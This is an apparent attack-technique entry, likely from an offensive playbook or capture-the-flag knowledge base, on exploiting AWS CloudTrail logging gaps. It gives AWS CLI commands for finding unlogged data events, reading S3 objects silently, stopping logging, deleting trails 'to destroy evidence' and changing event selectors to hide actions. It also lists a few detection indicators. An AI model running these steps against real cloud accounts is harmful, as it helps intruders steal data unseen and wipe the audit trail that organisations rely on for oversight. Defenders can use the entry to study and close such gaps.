title: CloudTrail Logging Gap — Unrecorded API Endpoint Exploitation
description: AWS CloudTrail records API activity but certain API endpoints, regions, and event types may not be fully captured — creating logging gaps that attackers can exploit for silent enumeration and data access. Attack: (1) Check CloudTrail configuration: aws cloudtrail describe-trails to list trails and their status. (2) Get event selectors: aws cloudtrail get-event-selectors --trail-name TRAIL_NAME to see which events are logged (management vs data events). (3) Identify unrecorded API actions — data events (S3 object-level, DynamoDB streams, Lambda invocations) are often NOT logged by default, while management events (IAM, EC2 control plane) are logged. (4) Perform reconnaissance through unrecorded endpoints — e.g., S3 GetObject (data event) may not be in CloudTrail while S3 ListBuckets (management event) is. (5) If cloudtrail:StopLogging is allowed: aws cloudtrail stop-logging --name TRAIL_NAME to disable logging entirely. (6) If cloudtrail:DeleteTrail is allowed: aws cloudtrail delete-trail --name TRAIL_NAME to destroy evidence. (7) If cloudtrail:PutEventSelectors is allowed, modify selectors to exclude specific actions from logging. (8) Use IMDS credentials or role chaining for actions — the AssumeRole event is logged but subsequent actions with the assumed role may use different trails.
techniques: Check trail status: aws cloudtrail get-trail-status --name TRAIL_NAME
Get event selectors: aws cloudtrail get-event-selectors --trail-name TRAIL_NAME
Identify gaps: management events logged, data events often not logged by default
Stop logging: aws cloudtrail stop-logging --name TRAIL_NAME (requires cloudtrail:StopLogging)
Delete trail: aws cloudtrail delete-trail --name TRAIL_NAME (requires cloudtrail:DeleteTrail)
Modify selectors: aws cloudtrail put-event-selectors --trail-name TRAIL_NAME --event-selectors file://selectors.json
S3 data events: aws s3 cp s3://bucket/flag.txt - (may not be logged as data event)
indicators: Data events not configured for S3/DynamoDB/Lambda
Multi-region trail vs single-region trail gaps
prerequisites: Understanding of management vs data event logging
Knowledge of target resources to enumerate silently
